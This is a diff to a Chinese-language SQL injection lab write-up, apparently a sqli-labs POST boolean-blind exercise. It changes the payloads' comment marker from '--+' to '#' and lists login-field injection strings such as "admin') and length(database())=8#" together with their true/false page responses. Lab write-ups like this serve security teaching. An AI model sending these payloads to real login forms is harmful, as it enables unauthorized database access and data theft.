@@ -6,6 +6,7 @@
 |---|---|
 | **注入类型** | POST · 盲注 |
 | **闭合方式** | `')` |
+| **注释符** | `# · POST 表单必须用它，--+ 会失效` |
 | **成败信号** | flag.jpg / slap.jpg |
 | **一句话** | 不显示数据，只给图片 |
 | **核心 payload** | `uname=admin') and length(database())=8--+` |
@@ -34,7 +35,7 @@ if($row) {
 所以 UNION 也能让页面变成"成功"，但**看不到数据**：
 
 ```
-uname = admin') union select 1,2--+   →  出现 flag.jpg（但没有数据）
+uname = admin') union select 1,2#   →  出现 flag.jpg（但没有数据）
 ```
 
 要拿数据只能走**布尔盲注**。
@@ -43,13 +44,13 @@ uname = admin') union select 1,2--+   →  出现 flag.jpg（但没有数据）
 
 **闭合确认**
 ```
-uname = admin') --+   →  flag.jpg   ✓
+uname = admin')#   →  flag.jpg   ✓
 ```
 
 **布尔盲注（实测）**
 ```
-uname = admin') and length(database())=8--+   →  flag.jpg  （真）
-uname = admin') and length(database())=9--+   →  slap.jpg  （假）
+uname = admin') and length(database())=8#   →  flag.jpg  （真）
+uname = admin') and length(database())=9#   →  slap.jpg  （假）
 ```
 → 库名长度 = 8
 
